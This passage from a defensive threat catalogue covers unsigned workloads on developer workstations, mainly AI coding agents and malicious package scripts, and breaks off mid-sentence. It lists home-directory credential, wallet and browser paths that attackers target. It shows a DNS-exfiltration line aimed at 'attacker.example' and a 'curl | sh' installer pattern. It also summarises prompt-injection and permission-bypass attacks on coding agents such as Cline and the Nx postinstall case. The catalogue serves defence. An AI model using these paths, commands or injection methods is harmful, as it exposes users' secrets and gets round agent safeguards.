\hypertarget{purpose}{%
\chapter{Purpose}\label{purpose}}

This catalogue documents threats posed by unsigned workloads running at
the user level of a developer workstation. The motivating instances are
AI coding agents, but the same threats apply to package post-install
scripts, container images, MCP servers, and other code that runs as the
user's uid without arriving through a validated installation path.

The catalogue is written to be used independently of any particular
enforcement tool. Security teams can cite the threat identifiers in
their own policy documents, auditors can use the catalogue to evaluate
controls, and other tools in the space can adopt the identifiers as a
shared vocabulary. Where an entry describes how a threat is addressed,
it does so at the level of a confinement approach --- the property a
reference monitor at the user level must hold --- rather than the
mechanism of any one implementation.

A workload is ``unsigned'' if it arrived via paths the operating
system's package manager does not validate: npm, PyPI, or crates
packages, container images from public registries, AI agent binaries,
MCP servers, \texttt{curl\ \textbar{}\ sh} installers, AI-generated code
being executed locally. The catalogue uses ``workload'' generically.
Where a threat's realisation differs significantly between workload
classes, the entry notes the variants.

\hypertarget{conventions}{%
\chapter{Conventions}\label{conventions}}

\begin{itemize}
\tightlist
\item
  \textbf{T-numbers} identify threats a user-level confinement approach
  addresses.
\item
  \textbf{X-numbers} identify threats explicitly out of scope (Part 2).
\item
  T-numbers are stable within a published version of this catalogue and
  across patch revisions; major-version revisions may renumber.
\item
  Each in-scope entry follows a consistent structure: definition,
  observed instances with citations, attack pattern, confinement
  approach, residuals, ATT\&CK mapping.
\item
  ATT\&CK mappings reference MITRE ATT\&CK v15.1.
\end{itemize}

Threat identifiers are family-prefixed:
\texttt{T\textless{}family\textgreater{}.\textless{}index\textgreater{}}
within each in-scope family (T1.1, T2.8, T3.7), so a family's threats
carry a self-contained sequence. Out-of-scope threats keep their
\texttt{X} numbering.

\hypertarget{threat-families}{%
\chapter{Threat families}\label{threat-families}}

\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\columnwidth - 4\tabcolsep) * \real{0.3333}}
  >{\raggedright\arraybackslash}p{(\columnwidth - 4\tabcolsep) * \real{0.3333}}
  >{\raggedright\arraybackslash}p{(\columnwidth - 4\tabcolsep) * \real{0.3333}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
Family
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
IDs
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
Theme
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
Reconnaissance and exfiltration & T1.1--T1.14 & What the workload reads,
where it connects, what it leaks \\
Posture degradation & T2.1--T2.8 & What the workload does to the user's
host configuration and to the artefacts it produces \\
Workload-class-specific & T3.1--T3.10 & Threats whose realisation is
distinctive to a specific workload class (containers, MCP servers, build
environments) \\
Confinement attack surface & T5.1--T5.4 & Threats against the
confinement boundary's own crossing mechanism \\
Out of scope & X1--X11 & Threats a user-level confinement approach
deliberately does not address (Part 2) \\
\end{longtable}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\hypertarget{family-1-reconnaissance-and-exfiltration-t1.1t1.14}{%
\chapter{Family 1 --- Reconnaissance and exfiltration
(T1.1--T1.14)}\label{family-1-reconnaissance-and-exfiltration-t1.1t1.14}}

\hypertarget{t1.1-credential-history-and-configuration-reconnaissance}{%
\section{T1.1 --- Credential, history, and configuration
reconnaissance}\label{t1.1-credential-history-and-configuration-reconnaissance}}

\textbf{Definition.} An unsigned workload reads credentials, command
history, browser data, configuration files, and similar sensitive state
from the user's environment.

\textbf{Realisation across workload classes:} - \emph{AI coding agents:}
read files as part of task completion, on the theory that something
useful might be in them. Documented across all major agent vendors. -
\emph{Package post-install scripts:} read files programmatically as part
of the install script's payload. Nx is the canonical recent example. -
\emph{Container images:} read files through volume mounts the container
has been granted. \texttt{-v\ \$HOME:/home} exposes the full credential
set. - \emph{MCP servers:} read files as the agent invokes them, with
the MCP server's process running as the user's uid. -
\emph{\texttt{curl\ \textbar{}\ sh} installers:} read files in the
install script's payload.

\textbf{Observed instances.} The Nx s1ngularity supply-chain attack
(August 2025) provides the most-documented in-the-wild example. Eight
malicious Nx package versions contained a \texttt{telemetry.js}
postinstall script invoking
\texttt{claude\ -\/-dangerously-skip-permissions},
\texttt{gemini\ -\/-yolo}, and \texttt{q\ chat\ -\/-trust-all-tools}
with prompts to inventory and exfiltrate sensitive files. GitGuardian's
analysis documented 1,346 affected GitHub repositories, 2,349 distinct
exfiltrated secrets across 1,079 compromised developer systems; 90\% of
leaked GitHub tokens remained valid post-incident (Wiz research,
September 2025).

The Mindgard research on Cline (October 2025) demonstrated that
prompt-injected Python docstrings and Markdown files could coerce an AI
agent into reading environment variables and exfiltrating them via DNS
queries to attacker-controlled domains. Ping commands were typically
whitelisted as ``safe'', enabling exfiltration without user approval.

\textbf{Attack pattern.} The workload traverses the filesystem looking
for files matching credential patterns: \texttt{.ssh/}, \texttt{.aws/},
\texttt{.gnupg/}, \texttt{.config/gh/}, \texttt{.netrc},
\texttt{.npmrc}, \texttt{.docker/config.json}, \texttt{.kube/config},
password manager databases, browser cookie stores, shell history files,
cryptocurrency wallets. The pattern is the same whether the workload is
malicious (a poisoned postinstall script) or trained-to-be-thorough (an
AI agent reading what it can in case something is useful).

\textbf{Confinement approach.} Address this by absence rather than by
denial: the workload's home directory is a constructed view containing
only the paths policy explicitly grants, so credential locations are not
present to be read rather than present-and-refused. A workload cannot
enumerate what does not exist in its world. The complementary posture is
a default-deny floor over known credential locations, so a new workload
starts with nothing and widens deliberately.

\textbf{Residuals.} Within a granted project tree, the workload can
still encounter \texttt{.env*} files, embedded credentials in test
fixtures, \texttt{terraform.tfstate}, and similar in-band secrets.
Masking credential-shaped patterns within otherwise-granted directories
is best-effort against direct reads only; determined recovery via
indirect paths (reading a scrubbed file out of version-control history)
is not prevented. In-band secrets inside a granted tree are a residual
of any approach that grants the tree at all.

\textbf{MITRE ATT\&CK.} T1552 (Unsecured Credentials), T1083 (File and
Directory Discovery), T1005 (Data from Local System).

\textbf{Reconnaissance target enumeration.} Paths a credential-hunting
workload will typically attempt to read, by category:

\begin{itemize}
\tightlist
\item
  SSH and PGP: \texttt{\textasciitilde{}/.ssh/},
  \texttt{\textasciitilde{}/.gnupg/}
\item
  Cloud credentials: \texttt{\textasciitilde{}/.aws/},
  \texttt{\textasciitilde{}/.azure/},
  \texttt{\textasciitilde{}/.config/gcloud/},
  \texttt{\textasciitilde{}/.oci/},
  \texttt{\textasciitilde{}/.linode-cli},
  \texttt{\textasciitilde{}/.ibmcloud/},
  \texttt{\textasciitilde{}/.config/doctl/}
\item
  Forge tokens: \texttt{\textasciitilde{}/.config/gh/},
  \texttt{\textasciitilde{}/.config/glab/},
  \texttt{\textasciitilde{}/.config/hub},
  \texttt{\textasciitilde{}/.config/bitbucket-cli/}
\item
  Legacy auth: \texttt{\textasciitilde{}/.netrc}
\item
  Package manager credentials: \texttt{\textasciitilde{}/.npmrc},
  \texttt{\textasciitilde{}/.yarnrc},
  \texttt{\textasciitilde{}/.yarnrc.yml},
  \texttt{\textasciitilde{}/.pypirc},
  \texttt{\textasciitilde{}/.cargo/credentials},
  \texttt{\textasciitilde{}/.docker/config.json},
  \texttt{\textasciitilde{}/.kube/config}
\item
  Infrastructure tooling:
  \texttt{\textasciitilde{}/.terraform.d/credentials.tfrc.json},
  \texttt{\textasciitilde{}/.config/terraform/}
\item
  Password managers: \texttt{\textasciitilde{}/.password-store/},
  \texttt{\textasciitilde{}/.config/keepassxc/},
  \texttt{\textasciitilde{}/.config/Bitwarden*},
  \texttt{\textasciitilde{}/.config/1Password/}
\item
  System keyrings: \texttt{\textasciitilde{}/.local/share/keyrings/},
  \texttt{\textasciitilde{}/.gnome2/keyrings/}
\item
  Browser state: \texttt{\textasciitilde{}/.mozilla/},
  \texttt{\textasciitilde{}/.config/google-chrome/},
  \texttt{\textasciitilde{}/.config/chromium/},
  \texttt{\textasciitilde{}/.config/BraveSoftware/},
  \texttt{\textasciitilde{}/.config/microsoft-edge/},
  \texttt{\textasciitilde{}/.config/vivaldi/}
\item
  Messaging clients: \texttt{\textasciitilde{}/.config/Signal/},
  \texttt{\textasciitilde{}/.config/Slack/},
  \texttt{\textasciitilde{}/.config/discord/},
  \texttt{\textasciitilde{}/.config/Element/},
  \texttt{\textasciitilde{}/.thunderbird/}
\item
  Shell histories: \texttt{\textasciitilde{}/.bash\_history},
  \texttt{\textasciitilde{}/.zsh\_history},
  \texttt{\textasciitilde{}/.fish\_history},
  \texttt{\textasciitilde{}/.local/share/fish/fish\_history}
\item
  Tool histories: \texttt{\textasciitilde{}/.python\_history},
  \texttt{\textasciitilde{}/.node\_repl\_history},
  \texttt{\textasciitilde{}/.psql\_history},
  \texttt{\textasciitilde{}/.mysql\_history},
  \texttt{\textasciitilde{}/.sqlite\_history},
  \texttt{\textasciitilde{}/.lesshst},
  \texttt{\textasciitilde{}/.viminfo}
\item
  Cryptocurrency wallets: \texttt{\textasciitilde{}/.electrum/},
  \texttt{\textasciitilde{}/.bitcoin/},
  \texttt{\textasciitilde{}/.ethereum/},
  \texttt{\textasciitilde{}/.config/Exodus/},
  \texttt{\textasciitilde{}/.config/Atomic/}
\item
  VPN configuration: \texttt{\textasciitilde{}/.config/openvpn3/},
  \texttt{\textasciitilde{}/.config/wireguard/},
  \texttt{\textasciitilde{}/.cisco/},
  \texttt{\textasciitilde{}/.config/forticlient/}
\end{itemize}

Within typically-granted project trees:

\begin{itemize}
\tightlist
\item
  \texttt{.env}, \texttt{.env.local}, \texttt{.env.production},
  \texttt{.env.staging}, \texttt{.env.*}
\item
  \texttt{config/secrets.yml}, \texttt{application-prod.properties},
  \texttt{appsettings.json}
\item
  \texttt{terraform.tfstate} (contains every secret Terraform has
  touched)
\item
  \texttt{.envrc} (direnv source from secret stores)
\item
  \texttt{.git/config} with credential-helper URLs
\end{itemize}

\hypertarget{t1.2-malicious-post-install-scripts}{%
\section{T1.2 --- Malicious post-install
scripts}\label{t1.2-malicious-post-install-scripts}}

\textbf{Definition.} A package installed via \texttt{npm\ install},
\texttt{pip\ install}, \texttt{cargo\ build}, or equivalent executes a
post-install or build-time script that performs unintended actions,
including credential theft, lateral movement, or persistence.

\textbf{Observed instances.} The Nx attack (see T1.1) is the canonical
recent example. The Cline supply-chain incident (February 2026) saw the
malicious \texttt{cline@2.3.0} deliver \texttt{openclaw} globally via
postinstall; the payload was benign but the mechanism was identical to
attack variants. Earlier comparable incidents include
\texttt{event-stream} (2018) and \texttt{ua-parser-js} (2021). The axios
npm compromise (April 2026) delivered a remote access trojan via
postinstall in approximately two seconds --- before
\texttt{npm\ install} completed.

\textbf{Attack pattern.} A malicious or compromised package executes
attacker-controlled code with the user's full uid privileges during
install. Post-install scripts run unconditionally without user prompting
in npm by default. They have full filesystem read, network connect, and
exec capabilities.

\textbf{Confinement approach.} Run the install inside a confinement
whose network reaches only the package registry, whose writable scope is
the project tree plus a per-context cache, and whose executable set is
the package-manager tooling. A time-bounded confinement limits
persistence: a post-install script cannot establish long-lived
background access if the confinement expires when the install completes.
Where an offline mirror is available, network can be removed entirely.

\textbf{Residuals.} Compromise of the registry itself --- a malicious
package signed correctly by the legitimate maintainer --- is out of
scope. A confinement reduces post-install blast radius; it does not make
the underlying package trustworthy.

\textbf{MITRE ATT\&CK.} T1195.002 (Supply Chain Compromise: Compromise
Software Supply Chain), T1059 (Command and Scripting Interpreter).

\hypertarget{t1.3-compromised-ide-extensions-language-servers-mcp-servers-or-agent-plugins}{%
\section{T1.3 --- Compromised IDE extensions, language servers, MCP
servers, or agent
plugins}\label{t1.3-compromised-ide-extensions-language-servers-mcp-servers-or-agent-plugins}}

\textbf{Definition.} A trusted-by-default extension to the developer's
IDE, language server, or agent toolchain is compromised or maliciously
authored, and uses its standing privileges to exfiltrate data or modify
the user's environment.

\textbf{Observed instances.} The Cline VS Code extension (3.8 million
installs at time of disclosure) was disclosed in October 2025 to have
four critical prompt-injection vulnerabilities (Mindgard research). The
\texttt{.clinerules} directory feature allowed attackers to place
malicious Markdown that overrode the \texttt{requires\_approval} flag
for executed commands. CVE-2026-25725 (Claude Code) documented a sandbox
escape via \texttt{settings.json} injection. CVE-2025-59536 (Claude
Code, September 2025) demonstrated that malicious hooks in project
configuration files could execute shell commands during initialisation,
before the user saw any consent dialog.

\textbf{Attack pattern.} The extension runs in the IDE's process with
broad filesystem and network access. Either the extension is malicious,
or it is compromised via prompt injection from repository content it
reads. The compromised extension then performs attacker-directed
operations using its existing access.

\textbf{Confinement approach.} Per-extension confinement of the IDE is
impractical; the reachable target is the agent CLI the extension
invokes. Confining that CLI --- its filesystem, network, and
local-socket reach --- constrains any compromise that manifests through
agent-CLI invocations. A compromise operating entirely outside the agent
CLI (the extension talking to its own home server, reading files
directly in the IDE's process) is outside this scope; the IDE's own
sandbox model is the relevant control there.

\textbf{Residuals.} Extensions running in the IDE's own process are
outside a user-level workload confinement's scope. Industry red-team
guidance notes that hooks and MCP initialisation functions often run
outside a sandbox, offering an opportunity to escape sandbox controls;
the answer available here is to confine the agent CLI, not the IDE.

\textbf{MITRE ATT\&CK.} T1554 (Compromise Client Software Binary),
T1195.001 (Compromise Software Dependencies and Development Tools).

\hypertarget{t1.4-curl-...-sh-installer-of-an-untrusted-source}{%
\section{\texorpdfstring{T1.4 --- \texttt{curl\ ...\ \textbar{}\ sh}
installer of an untrusted
source}{T1.4 --- curl ... \textbar{} sh installer of an untrusted source}}\label{t1.4-curl-...-sh-installer-of-an-untrusted-source}}

\textbf{Definition.} A user or workload executes an installer script
downloaded directly from a URL, which performs attacker-controlled
operations during installation.

\textbf{Observed instances.} Documented widely as an industry pattern.
AI agents routinely use \texttt{curl\ \textbar{}\ sh} patterns when
installers exist for them, because the alternative install procedures
contain more friction. Specific in-the-wild instances are difficult to
attribute, but the pattern is referenced in nearly every
AI-agent-sandboxing tool's documentation as a primary motivating threat.

\textbf{Attack pattern.} An agent or user invokes
\texttt{curl\ -fsSL\ https://example.com/install.sh\ \textbar{}\ sh}.
The script runs immediately with full user privileges. Common follow-on
actions: credential harvesting, backdoor installation, modification of
\texttt{\textasciitilde{}/.bashrc}/\texttt{\textasciitilde{}/.zshrc} for
persistence, reconnaissance.

\textbf{Confinement approach.} An inspect-only posture denies all
network and all execution outside an inspection-tool set, so a
downloaded script cannot be run by default. Running the installer is a
deliberate move to an install-capable confinement with the specific
source allowed. The default refuses to execute downloaded shell scripts;
the user consents deliberately.

\textbf{Residuals.} Once the user authorises an install-capable
confinement for a specific URL, that URL is trusted. The confinement
cannot evaluate the script's contents; it bounds what the script can do
once running.

\textbf{MITRE ATT\&CK.} T1059.004 (Unix Shell), T1105 (Ingress Tool
Transfer).

\hypertarget{t1.5-build-script-in-a-freshly-cloned-unvetted-repository}{%
\section{T1.5 --- Build script in a freshly cloned, unvetted
repository}\label{t1.5-build-script-in-a-freshly-cloned-unvetted-repository}}

\textbf{Definition.} A user clones a repository to inspect its code, and
the act of opening or building it triggers attacker-controlled scripts
(Makefile, \texttt{package.json} scripts, postinstall hooks,
\texttt{.vscode/tasks.json}).

\textbf{Observed instances.} The Nx attack (T1.1, T1.2) is triggered by
\texttt{npm\ install}. The Mindgard Cline research demonstrated that
simply opening a malicious repository in an IDE with the Cline extension
could trigger code execution via prompt injection in
\texttt{.clinerules} or docstrings.

\textbf{Attack pattern.} The user clones, the IDE indexes and opens the
repository, the agent or build system processes files, and malicious
code executes. Particularly acute for AI agents because ``analyse this
repository'' often involves the agent reading config files, running
tooling, or invoking the project's build system.

\textbf{Confinement approach.} An inspect-only posture grants read-only
access to the cloned tree, denies execution beyond inspection utilities,
and denies network, so the user can read (cat, grep, find, less) without
any script execution. Moving to a build-capable posture is a deliberate
policy change, surfaced in the diff a reviewer sees before it takes
effect.

\textbf{Residuals.} Once the user explicitly invokes the build system
after inspection, the threat from T1.2 applies.

\textbf{MITRE ATT\&CK.} T1204.002 (User Execution: Malicious File).

\hypertarget{t1.6-lateral-movement-to-local-services}{%
\section{T1.6 --- Lateral movement to local
services}\label{t1.6-lateral-movement-to-local-services}}

\textbf{Definition.} A confined workload reaches local services (a
database, an SSH agent, a container daemon, the desktop session bus) on
the host loopback or a local socket and uses them to exfiltrate data,
escalate, or persist.

\textbf{Observed instances.} Repeatedly observed when AI agents are
given broad network access. The Ona research (March 2026) cites the
local-services attack surface as a primary motivation for kernel-level
enforcement.

\textbf{Attack pattern.} The workload connects to a local database on
loopback, authenticates with credentials it found in T1.1
reconnaissance, and reads or modifies data. Or it connects to an SSH
agent socket and uses the user's authenticated connections. Or it
reaches the session bus and asks the service manager to launch a
persistence service.

\textbf{Confinement approach.} Give the workload its own private
loopback, distinct from the user's, so host loopback services are not
reachable by default and every grant is explicit. Reach a local service
through a brokered connection named in policy rather than an open socket
path, so there is nothing to enumerate or connect to out of band. Two
cases deserve their own treatment. \textbf{Host network reconnaissance:}
a confinement that shares the host network namespace lets the workload
read the host's network state --- interfaces, routes, the
listening-socket table, the neighbour table --- through multiple
independent interfaces, so masking any one does not close it; the
structural answer is a private network namespace, in which the host's
network state is never visible and the recon is closed at the source. A
mode that deliberately shares the host stack reinstates this in full,
which is why such a mode should require a stated reason and surface the
reinstated exposure. \textbf{Signing agents:} exposing an SSH agent
socket into the confinement is a destination-blind signing oracle ---
the agent protocol carries a to-be-signed blob, not a destination, so a
workload can have an allowed key sign against an attacker-chosen host.
The approach that holds is to expose no agent and no key, and route
signing through a re-origination step that binds each signature to a
destination the host verified, with the real key kept host-side. This is
the authentication-versus-attestation line: authentication is a
constrained, host-verifiable act a confinement can mediate; attestation
(a signature vouching for data, a commit signature) is the operator
vouching, which must never be delegated to untrusted code. A
commit-signing agent is therefore the sharper case and is left to the
host --- the workload commits unsigned, the human signs on review.

\textbf{Residuals.} Explicit grants can re-expose specific services (a
development database on loopback); those grants are threat-tagged and
surfaced in the diff. A mode sharing the host network namespace
reinstates host-network reconnaissance in full and, in a root deployment
context, can reach raw-socket access to the host links; both are
acknowledged trade-offs of that mode, not defaults. For signing, a
narrower residual remains: a non-interactive key, once granted, can be
driven for its granted destinations, gated only by the key's own custody
(a hardware key forces a touch). An agent grant that reintroduces the
destination-blind oracle is a footgun, warned loudly and never a
sanctioned path.

\textbf{MITRE ATT\&CK.} T1021 (Remote Services), T1570 (Lateral Tool
Transfer).

\hypertarget{t1.7-dns-based-exfiltration-to-an-authorised-resolver}{%
\section{T1.7 --- DNS-based exfiltration to an authorised
resolver}\label{t1.7-dns-based-exfiltration-to-an-authorised-resolver}}

\textbf{Definition.} A confined workload exfiltrates data by encoding it
into DNS queries sent to its authorised resolver, which forwards them to
an attacker-controlled authoritative nameserver.

\textbf{Observed instances.} The Mindgard Cline research (October 2025)
demonstrated this technique: prompt-injected instructions caused the
agent to read environment variables and encode them into DNS queries via
\texttt{ping} commands, which were on a default safe-command allowlist.

\textbf{Attack pattern.} The attacker controls a domain
\texttt{attacker.example}. The workload reads sensitive data, splits it
into DNS-label-sized chunks, and issues
\texttt{nslookup\ \textless{}chunk\textgreater{}.attacker.example}
queries. The authorised resolver forwards them to the attacker's
nameserver, which logs them.

\textbf{Confinement approach.} Remove the workload's ability to make raw
DNS queries. Resolution happens on the workload's behalf, against a
policy-restricted name allowlist, so a name outside the allowlist is
never resolved and never leaves. Resolution tooling is not in the
executable set, and arbitrary-host reachability is not in the network
policy, so the direct query channel does not exist rather than being
filtered. This closes DNS exfiltration as a channel that does not exist,
distinct from one that is watched.

\textbf{Residuals.} Determined exfiltration via resolution of allowed
names remains possible: a workload that can contact an allowed API can
encode small amounts of data into the host part of legitimate-looking
subdomain queries. This is the same in-band exfiltration problem as
T1.8.

\textbf{MITRE ATT\&CK.} T1071.004 (Application Layer Protocol: DNS),
T1048 (Exfiltration Over Alternative Protocol).

\hypertarget{t1.8-exfiltration-via-tls-to-an-allowlisted-destination}{%
\section{T1.8 --- Exfiltration via TLS to an allowlisted
destination}\label{t1.8-exfiltration-via-tls-to-an-allowlisted-destination}}

\textbf{Definition.} A confined workload exfiltrates data by sending it
inside otherwise-legitimate TLS-encrypted requests to a destination the
policy permits.

\textbf{Observed instances.} Any workload with legitimate access to a
public model API can include exfiltrated data in API requests. The
Bunnyshell coding-agent-sandbox documentation (March 2026) identifies
this as the most-cited residual in the sandbox-wrapper community.

\textbf{Attack pattern.} The workload has policy-granted access to a
remote API, reads sensitive data, and constructs API requests containing
that data --- in the prompt body, in metadata, in tool-call arguments.
The requests succeed because they look like legitimate API traffic.

\textbf{Confinement approach.} The control is the destination allowlist,
not the payload: a confinement reaches only the endpoints its policy
grants, so the narrower the allowlist the smaller the channel.
Byte-counting and rate-limiting at the egress point surface high-volume
exfiltration (though not low-volume targeted leaks), and structured
per-request audit records the destination, connection tuple, and volume.
Removing ambient host secrets from the workload's view (T1.1) keeps them
out of this channel, but does nothing for data the workload is
legitimately granted, so that defence and this channel are disjoint.

\textbf{Residuals.} A workload that legitimately needs to send code or
data to its API can include exfiltrated content within that legitimate
traffic --- most sharply the model-API in-band case, where an agent
encodes reconnaissance or source directly into the prompt body. This is
unblockable at the egress boundary without destroying the workload's
function. This marks a boundary: user-level confinement addresses
workstation \emph{infrastructure} --- what the workload reads, where it
connects --- not application-level \emph{data governance}; deciding
which data may legitimately leave inside an authorised API call is a DLP
or model-alignment concern outside this scope. Catalogued as X9 (and,
for the semantic-review limit, X11) in Part 2; a confinement reduces but
does not eliminate it.

\textbf{MITRE ATT\&CK.} T1071.001 (Application Layer Protocol: Web
Protocols), T1041 (Exfiltration Over C2 Channel).

\hypertarget{t1.9-supply-chain-compromise-of-an-allowed-dependency}{%
\section{T1.9 --- Supply-chain compromise of an allowed
dependency}\label{t1.9-supply-chain-compromise-of-an-allowed-dependency}}

\textbf{Definition.} A dependency that policy legitimately allows is
itself compromised (maintainer account takeover, malicious contributor,
build pipeline attack), introducing attacker-controlled code.

\textbf{Observed instances.} Notable instances: \texttt{ua-parser-js}
(October 2021), \texttt{event-stream} (2018), the ESLint/Prettier
maintainer-account phishing (July 2025), Ultralytics (December 2024), Nx
(August 2025), Cline (February 2026). The Clinejection writeup (Adnan
Khan, February 2026) is the most-detailed recent technical analysis.

\textbf{Attack pattern.} The attacker compromises a maintainer account,
a CI/CD pipeline, or contributes a malicious PR that gets merged. The
next release contains attacker code. Downstream users install it via
standard means; the attacker code runs with the trust granted to the
dependency.

\textbf{Confinement approach.} A network and filesystem audit surfaces
unexpected destinations a dependency contacts: a compromised package
that suddenly reaches an unfamiliar host shows up in the record, and any
attempt to reach beyond policy grants is logged. This is detection, not
prevention --- the confinement reduces blast radius via its filesystem
and network constraints and records the deviation.

\textbf{Residuals.} A confinement does not evaluate dependency contents.
A compromised dependency operating entirely within its granted
capabilities --- increasingly common --- is undetectable. This is the
dependency-trust problem, structurally outside any runtime confinement's
scope.

\textbf{MITRE ATT\&CK.} T1195.002 (Compromise Software Supply Chain).

\hypertarget{t1.10-long-lived-workload-capability-creep}{%
\section{T1.10 --- Long-lived workload capability
creep}\label{t1.10-long-lived-workload-capability-creep}}

\textbf{Definition.} A development tool (language server, watcher,
daemon) accumulates capability over weeks or months without re-consent,
becoming a high-value persistent attacker target.

\textbf{Observed instances.} Architectural threat rather than specific
incident; documented in the supply-chain literature (language-server
CVEs throughout 2024--2025).

\textbf{Attack pattern.} A tool is granted broad capabilities for an
initial valid reason, then continues to run with those capabilities
indefinitely. If it is later compromised (via supply-chain attack,
prompt injection, or memory corruption), the attacker inherits the
accumulated capability.

\textbf{Confinement approach.} Time-bound the confinement and require
periodic re-consent, making capability expiration explicit. A short
re-consent interval forces the user to acknowledge continued operation;
a short lifetime prevents capability accumulating across a workday's
inattention. The approach makes the convenience-versus-accumulation
trade legible rather than enforcing one direction.

\textbf{Residuals.} Users may set lifetimes to ``never'' for
convenience; the approach warns but does not refuse. Long-lived
confinements trade convenience for capability accumulation, made legible
rather than prevented.

\textbf{MITRE ATT\&CK.} T1098 (Account Manipulation), T1543 (Create or
Modify System Process).

\hypertarget{t1.11-compromised-browser-lateral-movement}{%
\section{T1.11 --- Compromised browser, lateral
movement}\label{t1.11-compromised-browser-lateral-movement}}

\textbf{Definition.} A web browser process running as the user's uid is
compromised via malicious web content or extension and attempts lateral
movement to other resources on the workstation.

\textbf{Observed instances.} Generic threat well-documented in industry
literature; specific recent in-the-wild examples vary in relevance.

\textbf{Attack pattern.} The browser is compromised via a JavaScript
exploit, a malicious extension, or in-browser malware. It has uid-level
access to everything on the workstation. Lateral-movement targets
include other browser profiles, agent sockets, local databases, the
user's filesystem.

\textbf{Confinement approach.} A browser run inside a confinement
inherits the T1.1, T1.2, and T1.6 protections. A browser run unconfined
(the typical case) is outside scope; a purpose-built application sandbox
is the more appropriate control for browser confinement. The claim
available here is narrower: other confinements on the same workstation
cannot be reached from a compromised browser, because per-confinement
loopback isolation and brokered sockets prevent the lateral reach.

\textbf{Residuals.} Browser threats are largely outside a user-level
workload confinement's typical deployment scope.

\textbf{MITRE ATT\&CK.} T1189 (Drive-by Compromise), T1218 (System
Binary Proxy Execution).

\hypertarget{t1.12-confined-gui-the-host-compositor-leg}{%
\section{T1.12 --- Confined GUI: the host-compositor
leg}\label{t1.12-confined-gui-the-host-compositor-leg}}

\textbf{Definition.} Under a confined-GUI approach, a graphical
workload's display server is its own nested inner compositor, never the
host's; a single GUI-service confinement holds the one connection to the
host compositor, held only to vend per-workload host resources to the
inner compositors it spawns. That one host leg is a host-reach a
confined component holds --- the T1.6-equivalent for the display,
lateral reach concentrated in one place rather than handed to every
graphical workload.

\textbf{Realisation.} The danger of the obvious design --- bind the host
compositor's socket into each graphical workload's view --- is that the
workload becomes a direct client of the host compositor, reaching
whatever that compositor exposes to a client (screen-copy and
virtual-input globals, the other connected clients), a host-session
reach in the same shape as a compromised browser's lateral movement
(T1.11). The confined-GUI approach removes that from the workload
entirely: the workload sees only its own inner compositor's globals, the
host socket absent from its view. What remains is the GUI-service
component's single connection to the host compositor.

\textbf{Attack pattern.} A compromised GUI-service component (or a
compromise of the inner compositor it runs) holds one ordinary
display-client connection to the host compositor and can do with it
whatever the host compositor permits any client --- read what it
composites, drive whatever globals the host exposes, reach the host's
other display clients if the host does not isolate them. This is the
host-session reach of T1.11 narrowed to a single connection held by one
confined component rather than ambient to every graphical workload.

\textbf{Confinement approach.} Concentration, not elimination. Exactly
one party reaches the host compositor --- the GUI-service component ---
and only to vend connected resources to the inner compositors it spawns;
no workload holds the host leg and no unconfined host process holds
standing display capability. Even there it is one ordinary display
client, contained by the host compositor's own client isolation the way
any application is. The leg is loud: it is declared with a required
reason and surfaced as a derived exposure. The inner compositor's own
capture and input globals reach only the workload's own surfaces, never
the host screen or a sibling, so this one leg is the whole host-facing
surface --- concentrated and reasoned, not a workload-craftable host
capture.

\textbf{Residuals.} The GUI-service component is trusted with one
host-compositor leg --- the scoped, threat-tagged residual of the
confined-GUI approach. The confinement bounds what the \emph{component}
reaches; it does not constrain what the host compositor exposes to a
legitimate client, so the leg's reach is bounded by the host
compositor's own client isolation, which the confinement does not own.
The residual is the concentration of host display-reach into one
reasoned place, not its removal.

\textbf{MITRE ATT\&CK.} T1021 (Remote Services), T1185 (Browser Session
Hijacking --- partial analogue: a held session to a host display
service).

\hypertarget{t1.13-abstract-socket-namespace-escape-via-host-net-mode}{%
\section{T1.13 --- Abstract-socket namespace escape via host net
mode}\label{t1.13-abstract-socket-namespace-escape-via-host-net-mode}}

\textbf{Definition.} A workload sharing the host network namespace while
also permitted the abstract-socket namespace reaches host-side services
bound on abstract sockets --- the display server, the session bus, any
daemon binding an abstract socket --- with no file-path, proxy, or
kernel-filter gate in the path. Abstract sockets are scoped to the
network namespace, not the mount namespace; sharing the host network
namespace removes the boundary entirely.

\textbf{Attack pattern.} This is distinct from T1.6 (host-network egress
reachability): it is an IPC escape below the proxy layer. A workload
connects to an abstract socket and reaches the host's display (screen
capture, input injection), the host's session bus (arbitrary method
calls on the user's behalf), or any daemon binding an abstract socket
--- all without any file-path mediation or proxy interception. The
attack surface is the full set of abstract sockets in the host's network
namespace.

\textbf{Confinement approach.} Make the combination --- permit abstract
sockets \emph{and} share the host network namespace --- a hard compile
error, refused with a diagnostic citing this threat, not a warning and
not a runtime check. Permitting abstract sockets is valid only when the
confinement owns its own network namespace, in which the abstract-socket
namespace is empty by construction (no host daemon has bound there), so
the workload cannot reach host-side abstract sockets regardless of any
additional kernel scoping. Kernel-level abstract-socket scoping, where
available, is defence-in-depth on top of the namespace boundary, never a
substitute.

\textbf{Residuals.} On kernels lacking the additional abstract-socket
scoping, the namespace boundary is the only control; the structural
safety argument (an empty abstract namespace in an own network
namespace) holds regardless, and the absence of the extra scoping is
informational, not a safety gap.

\textbf{MITRE ATT\&CK.} T1021 (Remote Services), T1559 (Inter-Process
Communication).

\hypertarget{t1.14-host-rootfs-visibility-the-unnarrowed-system-tree}{%
\section{T1.14 --- Host rootfs visibility: the unnarrowed system
tree}\label{t1.14-host-rootfs-visibility-the-unnarrowed-system-tree}}

\textbf{Definition.} A workload whose view binds the entire host system
tree (\texttt{/usr} and equivalents) read-only sees the complete
installed-package set, development headers, locally-installed software,
kernel source, and every file the administrator placed there. None of it
is executable if execution is separately gated, but it is readable: the
workload can enumerate the host's installed software, read headers for
vulnerability research, and map the host's configuration ---
reconnaissance that requires no privilege escalation and no escape.

\textbf{Attack pattern.} A compromised or malicious workload walks the
system tree to fingerprint the host (installed packages, kernel headers,
locally-built tools), identifies software versions with known
vulnerabilities, and exfiltrates the inventory via an allowed egress
channel. The attack requires only read access --- no execute, no write,
no privilege. The host's sprawl is the reconnaissance surface; narrowing
it reduces the attainable detail.

\textbf{Confinement approach.} Build the system view by absence: instead
of binding the whole tree, bind only the curated subtrees a
dynamically-linked workload needs (the binary directories, the
shared-library directories, architecture-independent data), and leave
